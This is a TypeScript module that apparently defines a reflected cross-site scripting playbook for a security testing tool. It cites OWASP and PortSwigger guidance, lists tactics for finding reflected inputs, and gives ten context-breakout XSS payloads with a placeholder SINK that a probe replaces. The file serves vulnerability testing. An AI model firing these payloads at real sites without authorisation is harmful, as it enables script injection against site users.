import type { Playbook } from "../types.js";

// Community-documented reflected-XSS knowledge. The SINK marker in each payload is
// replaced at probe time by a call that only runs if the payload actually executes,
// so a fired SINK is proof — not a guess.
export const xssReflected: Playbook = {
  vulnClass: "xss-reflected",
  title: "Reflected Cross-Site Scripting",
  references: [
    "OWASP WSTG-INPV-01 — Testing for Reflected Cross Site Scripting",
    "OWASP XSS Filter Evasion Cheat Sheet",
    "PortSwigger Web Security Academy — Reflected XSS",
  ],
  lookFor:
    "Inputs whose value is echoed back into the HTML response: search boxes, query-string " +
    "parameters, error and 'not found' pages that repeat input, and any ?param= that appears " +
    "verbatim in the page source.",
  tactics: [
    "Inject a harmless unique marker first to find which parameters reflect and where.",
    "Identify the reflection context: HTML body, an attribute value, or inside a <script> block.",
    "Choose payloads that break out of that specific context (see payloads).",
    "Confirm with xss_probe — only a fired SINK is a real finding.",
  ],
  payloads: [
    '<img src=x onerror="SINK">',
    '<svg onload="SINK">',
    '"><img src=x onerror="SINK">',
    '\'><img src=x onerror="SINK">',
    '</title><img src=x onerror="SINK">',
    '</textarea><img src=x onerror="SINK">',
    '"><svg/onload=SINK>',
    "<script>SINK</script>",
    '<body onload="SINK">',
    '<details open ontoggle="SINK">',
  ],
};
